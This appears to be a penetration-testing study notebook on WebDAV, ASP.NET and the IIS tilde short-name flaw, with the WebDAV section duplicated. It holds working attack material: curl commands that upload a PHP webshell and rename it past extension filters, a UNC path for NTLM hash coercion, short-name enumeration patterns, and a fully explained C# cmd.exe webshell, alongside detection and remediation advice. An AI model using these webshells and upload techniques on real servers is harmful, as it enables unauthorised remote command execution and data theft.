**WebDAV** (**Web Distributed Authoring and Versioning**, defined in **RFC 4918**) is an extension of the HTTP/1.1 protocol that enables clients to perform remote web content authoring operations.

It transforms a standard HTTP web server into a collaborative, read/write network file system, allowing users to create, edit, move, lock, and delete files directly on the remote server over standard web ports (80/443).

```
                      ┌────────────────────────────────────────┐
                      │             WebDAV Client              │
                      │ (Windows Explorer, Cadaver, cURL, etc) │
                      └──────────────────┬─────────────────────┘
                                         │
                   HTTP Request with WebDAV Methods (PROPFIND, PUT, MKCOL...)
                                         │
                                         ▼
                      ┌────────────────────────────────────────┐
                      │             Web Server                 │
                      │  (Apache mod_dav, IIS WebDAV, Nginx)   │
                      └──────────────────┬─────────────────────┘
                                         │
                               Reads/Writes Files
                                         │
                                         ▼
                      ┌────────────────────────────────────────┐
                      │          Server Filesystem             │
                      │      (/var/www/html/ or C:\inetpub\)   │
                      └────────────────────────────────────────┘

```

---

## 1. Custom HTTP Methods Introduced by WebDAV

WebDAV extends traditional HTTP verbs (`GET`, `POST`, `HEAD`, `OPTIONS`) with filesystem-oriented methods:

* `PROPFIND`: Retrieves metadata and structural properties (such as directory listings, author, creation date) encoded in XML.
* `PROPPATCH`: Modifies or deletes specific properties of a resource.
* `MKCOL` (*Make Collection*): Creates new directories or collections on the remote server.
* `COPY` / `MOVE`: Duplicates or relocates files and directory structures across paths.
* `LOCK` / `UNLOCK`: Implements resource-locking mechanisms to prevent concurrent write collisions (overwriting) by multiple authors.
* `PUT` / `DELETE`: Standard HTTP methods heavily utilized by WebDAV to upload new files or remove remote resources.

---

## 2. Offensive Security & Bug Hunting Impact

From a penetration testing and bug bounty perspective, exposed or misconfigured WebDAV modules are high-value targets for several critical attack vectors:

* **Arbitrary File Upload to RCE:**
* If authentication is weak or missing, attackers can execute a `PUT` request to upload a webshell (e.g., `.php`, `.asp`, `.aspx`, `.jsp`).
* *Extension Blacklist Bypass via `MOVE`:* If direct `PUT` of executable files like `shell.php` is blocked by an application filter, an attacker uploads `shell.txt` via `PUT`, then issues a `MOVE` request with `Destination: /shell.php` to bypass upload filters.


* **Sensitive Information Disclosure:**
* The `PROPFIND` method often leaks complete internal file paths, hidden backup files, directory trees, and internal server configuration details in its XML responses.


* **Authentication Bypasses & Weak Credentials:**
* WebDAV frequently relies on standard HTTP Basic or Digest authentication, making it vulnerable to brute-force attacks via credential spraying if rate-limiting is absent.


* **NTLM Hash Stealing (Coerced Authentication):**
* Windows systems natively support WebDAV via the `WebClient` service. Attackers can use UNC paths pointing to an attacker-controlled WebDAV server (e.g., `\\attacker-ip@80\share`) to trigger automatic NTLM hash transmission for offline cracking or NTLM Relay attacks.



---

## 3. Practical Discovery & Exploitation Commands

### A. Reconnaissance via `OPTIONS` (cURL)

Identify if WebDAV is enabled by inspecting the `Allow` and `DAV` response headers:

```bash
curl -i -X OPTIONS https://target.com/webdav/

```

*Look for:* `DAV: 1, 2` and methods like `PROPFIND, MKCOL, LOCK, PUT`.

### B. Directory Enumeration (`PROPFIND`)

Query the directory structure:

```bash
curl -X PROPFIND -H "Depth: 1" https://target.com/webdav/

```

### C. File Upload and Execution (`PUT` + `MOVE`)

```bash
# 1. Upload benign extension
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" https://target.com/webdav/shell.txt

# 2. Rename to executable extension
curl -X MOVE -H "Destination: https://target.com/webdav/shell.php" https://target.com/webdav/shell.txt

```

### D. Dedicated Automation Tools

* `davtest`: Automates testing of WebDAV configurations by attempting to upload executable files of various types (`.php`, `.asp`, `.jsp`, `.html`).
* `cadaver`: Command-line WebDAV client supporting an FTP-like interface for manual file manipulation.

---

> **Key Insight:** WebDAV turns web endpoints into writeable file systems. When auditing an application, check the `OPTIONS` response header for `DAV:` compliance; if methods like `PUT` and `MOVE` are allowed on an upload directory without strict extension enforcement, you can often achieve an immediate transition to Remote Code Execution (RCE).
<img width="700" height="800" alt="image" src="https://github.com/user-attachments/assets/6cef00cf-dfd8-41f5-a2b8-b7ed9409f4b6" />
**WebDAV** (**Web Distributed Authoring and Versioning**, defined in **RFC 4918**) is an extension of the HTTP/1.1 protocol that enables clients to perform remote web content authoring operations.

It transforms a standard HTTP web server into a collaborative, read/write network file system, allowing users to create, edit, move, lock, and delete files directly on the remote server over standard web ports (80/443).

```
                      ┌────────────────────────────────────────┐
                      │             WebDAV Client              │
                      │ (Windows Explorer, Cadaver, cURL, etc) │
                      └──────────────────┬─────────────────────┘
                                         │
                   HTTP Request with WebDAV Methods (PROPFIND, PUT, MKCOL...)
                                         │
                                         ▼
                      ┌────────────────────────────────────────┐
                      │             Web Server                 │
                      │  (Apache mod_dav, IIS WebDAV, Nginx)   │
                      └──────────────────┬─────────────────────┘
                                         │
                               Reads/Writes Files
                                         │
                                         ▼
                      ┌────────────────────────────────────────┐
                      │          Server Filesystem             │
                      │      (/var/www/html/ or C:\inetpub\)   │
                      └────────────────────────────────────────┘

```

---

## 1. Custom HTTP Methods Introduced by WebDAV

WebDAV extends traditional HTTP verbs (`GET`, `POST`, `HEAD`, `OPTIONS`) with filesystem-oriented methods:

* `PROPFIND`: Retrieves metadata and structural properties (such as directory listings, author, creation date) encoded in XML.
* `PROPPATCH`: Modifies or deletes specific properties of a resource.
* `MKCOL` (*Make Collection*): Creates new directories or collections on the remote server.
* `COPY` / `MOVE`: Duplicates or relocates files and directory structures across paths.
* `LOCK` / `UNLOCK`: Implements resource-locking mechanisms to prevent concurrent write collisions (overwriting) by multiple authors.
* `PUT` / `DELETE`: Standard HTTP methods heavily utilized by WebDAV to upload new files or remove remote resources.

---

## 2. Offensive Security & Bug Hunting Impact

From a penetration testing and bug bounty perspective, exposed or misconfigured WebDAV modules are high-value targets for several critical attack vectors:

* **Arbitrary File Upload to RCE:**
* If authentication is weak or missing, attackers can execute a `PUT` request to upload a webshell (e.g., `.php`, `.asp`, `.aspx`, `.jsp`).
* *Extension Blacklist Bypass via `MOVE`:* If direct `PUT` of executable files like `shell.php` is blocked by an application filter, an attacker uploads `shell.txt` via `PUT`, then issues a `MOVE` request with `Destination: /shell.php` to bypass upload filters.


* **Sensitive Information Disclosure:**
* The `PROPFIND` method often leaks complete internal file paths, hidden backup files, directory trees, and internal server configuration details in its XML responses.


* **Authentication Bypasses & Weak Credentials:**
* WebDAV frequently relies on standard HTTP Basic or Digest authentication, making it vulnerable to brute-force attacks via credential spraying if rate-limiting is absent.


* **NTLM Hash Stealing (Coerced Authentication):**
* Windows systems natively support WebDAV via the `WebClient` service. Attackers can use UNC paths pointing to an attacker-controlled WebDAV server (e.g., `\\attacker-ip@80\share`) to trigger automatic NTLM hash transmission for offline cracking or NTLM Relay attacks.



---

## 3. Practical Discovery & Exploitation Commands

### A. Reconnaissance via `OPTIONS` (cURL)

Identify if WebDAV is enabled by inspecting the `Allow` and `DAV` response headers:

```bash
curl -i -X OPTIONS https://target.com/webdav/

```

*Look for:* `DAV: 1, 2` and methods like `PROPFIND, MKCOL, LOCK, PUT`.

### B. Directory Enumeration (`PROPFIND`)

Query the directory structure:

```bash
curl -X PROPFIND -H "Depth: 1" https://target.com/webdav/

```

### C. File Upload and Execution (`PUT` + `MOVE`)

```bash
# 1. Upload benign extension
curl -X PUT -d "<?php system(\$_GET['cmd']); ?>" https://target.com/webdav/shell.txt

# 2. Rename to executable extension
curl -X MOVE -H "Destination: https://target.com/webdav/shell.php" https://target.com/webdav/shell.txt

```

### D. Dedicated Automation Tools

* `davtest`: Automates testing of WebDAV configurations by attempting to upload executable files of various types (`.php`, `.asp`, `.jsp`, `.html`).
* `cadaver`: Command-line WebDAV client supporting an FTP-like interface for manual file manipulation.

---

> **Key Insight:** WebDAV turns web endpoints into writeable file systems. When auditing an application, check the `OPTIONS` response header for `DAV:` compliance; if methods like `PUT` and `MOVE` are allowed on an upload directory without strict extension enforcement, you can often achieve an immediate transition to Remote Code Execution (RCE).



**ASP.NET** is an open-source, server-side web application framework created by Microsoft for building dynamic web applications, microservices, APIs, and enterprise web solutions.

It compiles code written in high-level languages (primarily **C#**) into Intermediate Language (IL), which is then executed by the **Common Language Runtime (CLR)** or modern **.NET Runtime**.

---

## 1. Evolution: ASP.NET vs. ASP.NET Core

Modern development divides the ecosystem into two major generations:

* **ASP.NET (.NET Framework - Legacy):**
* Tightly coupled to the Windows operating system and **Internet Information Services (IIS)** web servers.
* Relies heavily on `web.config` files for routing, security handlers, and runtime configurations.


* **ASP.NET Core (Modern):**
* A high-performance, open-source, modular, and cross-platform framework (runs on Linux, macOS, Docker, and Windows).
* Employs **Kestrel** as its default, high-throughput asynchronous web server, often sitting behind reverse proxies like Nginx, Apache, or IIS.



---

## 2. Core Architecture & Development Models

ASP.NET provides several paradigms for developing web resources:

```
                           ┌───────────────────────────────┐
                           │       ASP.NET Framework       │
                           └───────────────┬───────────────┘
                                           │
         ┌───────────────────┬─────────────┴───────┬───────────────────┐
         ▼                   ▼                     ▼                   ▼
┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐ ┌─────────────────┐
│  ASP.NET Core   │ │   ASP.NET MVC   │ │ ASP.NET Web API │ │ Legacy Forms /  │
│  Razor / Blazor │ │(Model-View-Ctrl)│ │ (REST / JSON)   │ │    ViewState    │
└─────────────────┘ └─────────────────┘ └─────────────────┘ └─────────────────┘

```

* **ASP.NET MVC (Model-View-Controller):** Separates the application into the Model (business data), View (UI templates using Razor syntax `.cshtml`), and Controller (request handling).
* **ASP.NET Web API:** Designed exclusively for building RESTful endpoints and microservices that communicate using JSON or XML.
* **Blazor:** A modern frontend framework allowing developers to build interactive client-side web UIs using C# instead of JavaScript (via WebAssembly or SignalR WebSockets).
* **ASP.NET Web Forms (Legacy):** An event-driven, control-based architecture that relies on client-side state preservation via a hidden field called `__VIEWSTATE`.

---

## 3. Offensive Security & Bug Hunting Perspective

When auditing or pentesting an ASP.NET application, specific features and architectural quirks frequently lead to high-impact vulnerabilities:

* **ViewState Deserialization (Legacy Web Forms):**
* Legacy targets maintain user state in the hidden `__VIEWSTATE` parameter.
* If the `machineKey` is leaked or ViewState MAC validation is disabled (`EnableViewStateMac="false"`), attackers can craft serialized payloads (using tools like `ysoserial.net`) to achieve **Remote Code Execution (RCE)**.


* **Mass Assignment / Auto-Binding:**
* ASP.NET's Model Binder maps HTTP parameters directly to backend C# class properties.
* If developers do not use Data Transfer Objects (DTOs) or the `[Bind]` attribute, an attacker can append hidden object parameters (e.g., `{"Role": "Admin", "IsVerified": true}`) to elevate privileges.


* **IIS-Specific Path Normalization Quirks:**
* `web.config` authorization rules can sometimes be bypassed using Windows 8.3 short file names (e.g., `/admin~1/`) or semicolon/null-byte path injections.


* **Sensitive Configuration Exposure:**
* Misconfigured deployments may expose `web.config` or `appsettings.json` files, leaking database connection strings, JWT secret keys, and machine keys.



---

> **Key Insight:** While modern ASP.NET Core has strong built-in protections against basic attacks like SQL Injection and CSRF, the primary attack surface shifts to **Model Binding (Mass Assignment)**, **broken authorization middleware logic**, and **legacy ViewState/object deserialization flaws**.

This command is a specialized reconnaissance one-liner used in web penetration testing to **probe for enabled HTTP methods and WebDAV capabilities** on a target server while filtering out all unnecessary network noise.

---

## Component-by-Component Breakdown

```
curl -X OPTIONS http://10.49.191.0 -sv 2>&1 | grep -E "Allow:|DAV:"
└──┬─┘ ────┬──── ────────┬─────── ─┬─ ─┬── ┬ └──┬───────────────────┘
   │       │             │         │   │   │    └─ Filter for specific headers
   │       │             │         │   │   └─ Pipe stream to grep
   │       │             │         │   └─ Merge stderr (2) into stdout (1)
   │       │             │         └─ Run quietly (-s) with verbose headers (-v)
   │       │             └─ Target server URL / IP
   │       └─ Set HTTP Request Method to OPTIONS
   └─ Client URL transfer utility

```

### 1. `curl -X OPTIONS [http://10.49.191.0](http://10.49.191.0)`

* **`curl`**: Invokes the network transfer tool.
* **`-X OPTIONS`**: Forces the request method to `OPTIONS`. Instead of asking for webpage content (like `GET`), the `OPTIONS` method asks the web server: *"What HTTP methods and capabilities do you support on this resource?"*
* **`[http://10.49.191.0](http://10.49.191.0)`**: The target destination host/IP.

---

### 2. `-sv` (Silent + Verbose)

* **`-s` (`--silent`)**: Disables the default progress meter and meter-related output.
* **`-v` (`--verbose`)**: Forces cURL to print detailed connection logs, including DNS resolution, the TLS/TCP handshake, outgoing request headers (`>`), and incoming response headers (`<`).
* *Why combine them?* Combining `-s` and `-v` suppresses the progress bar while keeping only the handshake and raw HTTP header details.

---

### 3. `2>&1` (Standard Error Redirection — The Critical Link)

In Linux, programs handle output via numeric file descriptors:

* `1` = **Standard Output (`stdout`)** — Normal program output.
* `2` = **Standard Error (`stderr`)** — Diagnostic logs and errors.
* **The Problem:** `curl` sends all its `-v` verbose logs and header traces to **`stderr` (FD 2)**, not `stdout`.
* **The Solution:** The pipe operator (`|`) only reads from `stdout` (FD 1). If you pipe `curl -v` directly into `grep`, `grep` sees nothing.
* **`2>&1`** redirects Standard Error (2) into Standard Output (1), merging the verbose headers into the stream so `grep` can process them.

---

### 4. `| grep -E "Allow:|DAV:"`

* **`|` (Pipe)**: Sends the combined stream directly into the `grep` search tool.
* **`grep -E`**: Enables Extended Regular Expressions (`ERE`), allowing the logical OR (`|`) operator.
* **`"Allow:|DAV:"`**: Scans the incoming response stream and displays **only** the lines containing either `Allow:` or `DAV:`.

---

## Expected Output & Security Analysis

### If WebDAV / Dangerous Methods Are Enabled:

```http
< Allow: GET, POST, OPTIONS, HEAD, PUT, DELETE, PROPFIND, MKCOL
< DAV: 1, 2

```

* **`Allow:` Header:** Confirms what methods the server accepts. Methods like `PUT`, `DELETE`, `MOVE`, or `MKCOL` indicate write permissions on the web root.
* **`DAV:` Header:** Confirms the server is running WebDAV extensions (Class 1 and Class 2 compliance). This immediately unlocks vectors for file uploads, file manipulation, or directory structural enumeration via `PROPFIND`.

---

> **Key Insight:** `curl` sends diagnostic output (including HTTP response headers generated by `-v`) to `stderr` (`FD 2`). Without `2>&1`, piping to any text processing utility (`grep`, `awk`, `sed`) will fail silently because pipelines only pass `stdout` (`FD 1`).

This command is an active penetration testing probe attempting to upload an **ASP.NET (JScript) Proof-of-Concept (PoC)** file to an exposed WebDAV directory using the HTTP `PUT` method, and formatting the output to display only the resulting HTTP response status code.

---

## Command-by-Command Breakdown

```
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://10.49.191.0/webdav/test.aspx
└──┬─┘ ──────┬────── ──────────────┬───────────── ───┬── ──────────────────────────┬──────────────────────────── ──────────────┬───────────────────────────┘
   │         │                     │                 │                             │                                          └─ Destination target file URL
   │         │                     │                 │                             └─ ASP.NET JScript execution payload
   │         │                     │                 └─ Force HTTP method to PUT
   │         │                     └─ Format output to print only the HTTP status code
   │         └─ Suppress output and discard response body
   └─ Client URL transfer utility

```

### 1. Output Filtering Flags: `-s -o /dev/null -w "PUT aspx: %{http_code}\n"`

* **`-s` (`--silent`)**: Hides the transmission progress meter and non-fatal error outputs.
* **`-o /dev/null`**: Discards the actual HTTP response body (HTML/XML error text) into the Linux null device instead of printing it to your terminal screen.
* **`-w "PUT aspx: %{http_code}\n"`**: Uses cURL's write-out feature to extract the exact 3-digit HTTP status code (via `%{http_code}`) returned by the server and formats it with the prefix `PUT aspx: `.

---

### 2. Method and Payload: `-X PUT --data '...'`

* **`-X PUT`**: Instructs the web server to create or replace the target resource with the data provided in the request body.
* **`--data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>'`**: The payload sent in the request body.
* `<%@ Page Language=Jscript%>`: Defines the backend execution engine as **JScript.NET** rather than C# or VB.NET. (Often used in offensive engagements because JScript syntax allows stealthier, shorter one-liners).
* `<%Response.Write(1+1)%>`: A minimal, non-destructive Proof of Concept. If uploaded and executed, visiting `[http://10.49.191.0/webdav/test.aspx](http://10.49.191.0/webdav/test.aspx)` in a browser will return `2` instead of the raw code, proving **Remote Code Execution (RCE)** without triggering aggressive antivirus alerts.



---

### 3. Target Endpoint: `[http://10.49.191.0/webdav/test.aspx](http://10.49.191.0/webdav/test.aspx)`

* Targets the `/webdav/` directory and attempts to name the uploaded resource `test.aspx` (the file extension for compiled ASP.NET pages on IIS).

---

## Output Analysis: `PUT aspx: 401`

```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="WebDAV Storage"

```

* **Meaning:** The HTTP status code **`401 Unauthorized`** means the target server recognizes the `PUT` request, but refuses to process it because the request **lacks valid authentication credentials**.
* **Why it happened:** The `/webdav/` directory on this server is protected by an Access Control List (ACL) requiring HTTP Basic, Digest, or NTLM authentication. Anonymous users cannot write files to this path.

---

## Next Steps in an Assessment

When encountering a `401 Unauthorized` on a WebDAV `PUT` probe, testing typically branches into three steps:

* **1. Check Authentication Schemes:** Inspect the response headers with `curl -I [http://10.49.191.0/webdav/](http://10.49.191.0/webdav/)` to identify the required authentication mechanism (e.g., `WWW-Authenticate: Basic` vs `NTLM`).
* **2. Credential Spraying / Brute Force:** If Basic or Digest auth is in place, test common default credentials using `hydra`, `cURL -u "user:pass"`, or `davtest`.
* **3. Test Other Extensions / Paths:** Test if other folders allow unauthenticated writes, or if methods like `MOVE` / `PROPFIND` have differing access control policies.

---

> **Key Insight:** `Response.Write(1+1)` is the industry standard baseline for testing code execution in template engines and ASPX/PHP environments. Rather than jumping straight to full reverse shells that might get caught by Endpoint Detection (EDR) or fail due to network firewalls, evaluating mathematical arithmetic ($1+1=2$) gives an immediate, zero-noise verification of code execution.

In Microsoft Internet Information Services (IIS) and the underlying Windows/ASP.NET ecosystem, the tilde character (**`~`**) represents two major concepts: **NTFS 8.3 Short Filenames (a critical security enumeration vector)** and **the ASP.NET Virtual Application Root operator**.

---

## 1. The 8.3 Short Filename (SFN) Mechanism & IIS Tilde Vulnerability

The most critical security context of `~` in IIS stems from legacy MS-DOS **8.3 Short Filename Generation** on NTFS partitions.

### How Windows Generates 8.3 Names

When a file or directory has a name longer than 8 characters or contains spaces, Windows automatically creates a shortened 8-character alias using the tilde and a numeric index:

* `administrator_backup.zip` $\longrightarrow$ `ADMINI~1.ZIP`
* `configuration_settings.json` $\longrightarrow$ `CONFIG~1.JSO`
* `secret_passwords.txt` $\longrightarrow$ `SECRET~1.TXT`

```
Real File on Disk:        [ supersecret_database_backup_2026.bak ]
                                          │
                                 NTFS 8.3 Conversion
                                          │
                                          ▼
Short Name Alias:         [ SUPERS~1.BAK ]
                                          │
IIS Access:               GET /SUPERS~1.BAK  ──► Serves the file!

```

---

## 2. Offensive Impact: IIS Short Name Enumeration

IIS handles requests containing `~` and wildcard asterisks (`*`) in a unique way that allows unauthenticated attackers to **enumerate all files and directories on the web server**, even when directory listing is disabled.

### The Enumeration Anomaly

When querying an IIS server with a tilde pattern:

* **Target Exists:** If a file starting with `adm` exists (e.g., `admin_portal.aspx`), sending `GET /adm*~1*/.aspx` causes IIS to return an **HTTP 404 Not Found** (or 200/500 depending on the handler).
* **Target Does Not Exist:** If no file matches the prefix `xyz`, sending `GET /xyz*~1*/.aspx` causes IIS to return an **HTTP 400 Bad Request**.

By analyzing the difference between `HTTP 404` and `HTTP 400` responses, an attacker can brute-force every single file and folder character by character.

### Security Consequences:

* **Information Disclosure:** Reveals hidden backup files, secret admin directories, database dumps, and configuration files.
* **WAF & Access Control Bypass:** If a Web Application Firewall (WAF) or IIS URL Rewrite rule blocks access to `/secret_admin_dashboard/`, accessing `/SECRET~1/` directly can bypass string-matching security rules while still reaching the target resource.
* **Extension Truncation:** Short names truncate 4+ character extensions to 3 letters (e.g., `.config` $\rightarrow$ `.CON`, `.aspx` $\rightarrow$ `.ASP`).

---

## 3. The ASP.NET Virtual Root Operator (`~`)

In application development, `~` is used inside ASP.NET server-side code to represent the **root of the current virtual web application**:

* `~/Images/logo.png`: Instructs ASP.NET to resolve the path starting from the root directory of the application, regardless of how deeply nested the current sub-folder is.
* **Code Example:**
```csharp
// Resolves to "/MyWebApp/Handlers/Upload.ashx" automatically
string uploadHandler = VirtualPathUtility.ToAbsolute("~/Handlers/Upload.ashx");

```



---

## 4. Remediation & Defense

To eliminate the 8.3 tilde enumeration attack vector on production IIS servers:

* **Registry Level (Disable 8.3 Name Creation):**
```cmd
fsutil 8dot3name set 1

```


* **Strip Existing Short Names:**
Disabling the setting only prevents new files from generating short names. Existing directories must have their 8.3 names stripped:
```cmd
fsutil 8dot3name strip /s C:\inetpub\wwwroot

```


* **URL Filtering:** Configure the IIS Request Filtering module to reject any incoming URI containing the `~` character.

---

> **Key Insight:** In IIS security auditing, the tilde `~` is the universal indicator for 8.3 short filename aliasing. Finding endpoints that behave differently on `*~1*` queries gives an attacker an automated path to reconstruct the entire server-side file structure without needing directory listing permissions.



<img width="957" height="460" alt="image" src="https://github.com/user-attachments/assets/6093b7bc-1422-4959-ae32-44e61dd396c5" />
This snippet is a classic **inline ASP.NET (C#) single-line webshell**. It acts as an arbitrary command execution bridge, accepting system commands via HTTP GET requests and executing them directly on the underlying Windows host via the Windows Command Prompt (`cmd.exe`).

Here is the line-by-line technical breakdown of how each component operates within the .NET runtime and IIS worker process:

---

## Line-by-Line Technical Breakdown

### 1. Directive & Script Delimiter

```aspx
<%@ Page Language="C#" %>

```

* **What it does:** This is an ASP.NET Page Directive. It tells the IIS ASP.NET parser engine (`aspnet_isapi.dll` or the modern CLR handler) to compile the code within this file using the **C# compiler** (`csc.exe`) rather than VB.NET or JScript.

```aspx
<%

```

* **What it does:** An opening ASP.NET inline code render block. Any code placed between `<%` and `%>` is executed dynamically on the server side at request time before any HTML is sent to the client.

---

### 2. Input Retrieval

```csharp
string cmd = Request.QueryString["cmd"];

```

* **What it does:** Accesses the `HttpRequest.QueryString` collection to extract the value of the `cmd` parameter from the incoming URL (e.g., `http://target/shell.aspx?cmd=whoami`).
* **Mechanism:** It assigns the raw string value (e.g., `"whoami"`) to the local string variable `cmd`. If no `cmd` parameter is provided, `cmd` evaluates to `null`.

---

### 3. Null & Empty Check

```csharp
if (!string.IsNullOrEmpty(cmd)) {

```

* **What it does:** A safety guard condition. It checks whether `cmd` is neither `null` nor an empty string (`""`).
* **Mechanism:** If someone visits the page normally without passing a query parameter (e.g., just browsing to `shell.aspx`), the code inside the block will not execute, preventing the application from crashing or throwing a `NullReferenceException` on the server.

---

### 4. Process Initialization

```csharp
var proc = new System.Diagnostics.Process();

```

* **What it does:** Instantiates a new `Process` object from the `System.Diagnostics` namespace.
* **Mechanism:** In .NET, the `Process` class provides direct programmatic access to start, control, and terminate local system processes on the host operating system.

---

### 5. Defining the Executable & Arguments

```csharp
proc.StartInfo.FileName = "cmd.exe";

```

* **What it does:** Sets the executable file path inside `ProcessStartInfo`.
* **Mechanism:** Specifies `cmd.exe` (the Windows Command Processor located at `C:\Windows\System32\cmd.exe`). Because `System32` is in the default Windows `PATH` environment variable, the absolute path is not required.

```csharp
proc.StartInfo.Arguments = "/c " + cmd;

```

* **What it does:** Configures the command-line arguments passed to `cmd.exe`.
* **Mechanism:**
* `/c`: Instructs `cmd.exe` to run the specified command string and then terminate immediately.
* `+ cmd`: Concatenates the user's input directly to the argument string (e.g., `cmd.exe /c whoami /all`).



---

### 6. Stream Redirection & Subshell Control

```csharp
proc.StartInfo.UseShellExecute = false;

```

* **What it does:** Disables the operating system shell execution wrapper.
* **Mechanism:** When set to `false`, the process is spawned directly from the executable rather than through the Windows graphical shell (`explorer.exe`). **This is a mandatory prerequisite in .NET to redirect input/output streams.**

```csharp
proc.StartInfo.RedirectStandardOutput = true;

```

* **What it does:** Instructs the OS to pipe the process's **Standard Output (`stdout`)** stream back into the .NET application rather than outputting it to the host console window.
* **Mechanism:** Creates an internal pipe so the ASP.NET thread can read the text generated by the executed command.

---

### 7. Process Execution & Response Rendering

```csharp
proc.Start();

```

* **What it does:** Spawns the `cmd.exe` child process under the privileges of the active worker process (`w3wp.exe`).

```csharp
Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");

```

* **What it does:** Captures the process output and flushes it to the HTTP response stream sent back to the browser.
* **Mechanism:**
* `proc.StandardOutput.ReadToEnd()`: Reads the entire text stream from `stdout` until the process finishes and the stream closes.
* `<pre> ... </pre>`: Wraps the raw text output inside HTML preformatted text tags to preserve spaces, line breaks, and column alignments in the browser.
* `Response.Write(...)`: Injects this string directly into the outgoing HTTP body.



```aspx
}%>

```

* **What it does:** Closes the `if` condition block and the inline ASP.NET server-side execution block.

---

## Execution Flow & Security Architecture

```
[ Attacker Browser ]
        │
        │  GET /shell.aspx?cmd=whoami
        ▼
[ IIS Server (w3wp.exe) ]
        │
        ├── 1. ASP.NET Engine compiles and executes C#
        ├── 2. Reads Request.QueryString["cmd"] ("whoami")
        ├── 3. Spawns Child Process: cmd.exe /c whoami
        │         │
        │         ▼
        ├── 4. Captures stdout: "iis apppool\defaultapppool"
        │
        ▼
[ Returns HTTP 200 OK ]
<pre>iis apppool\defaultapppool</pre>

```

---

## Defensive & Forensic Considerations

* **Process Spawning Detection:** In security monitoring (EDR/SIEM), a web server process (`w3wp.exe`) spawning a command shell (`cmd.exe` or `powershell.exe`) as a child process is a high-confidence indicator of compromise (IoC).
* **Missing Error Stream (`stderr`):** This simple script only redirects `StandardOutput`. If a command fails (e.g., typing an invalid command name), the error is written to `stderr` (`FD 2`), which is not captured by `ReadToEnd()`, resulting in a blank response.
* **Execution Privilege:** The commands do not execute as `Administrator` or `SYSTEM` by default; they inherit the security token of the IIS Application Pool identity (`IIS APPPOOL\<PoolName>`), which typically holds low-privileged service permissions.

---

> **Key Insight:** This webshell leverages the .NET `System.Diagnostics.Process` API to bridge unauthenticated HTTP inputs directly into the Windows operating system shell. In secure code auditing, unvalidated calls to system processes without strict argument whitelisting represent direct Command Injection vulnerabilities (CWE-78).

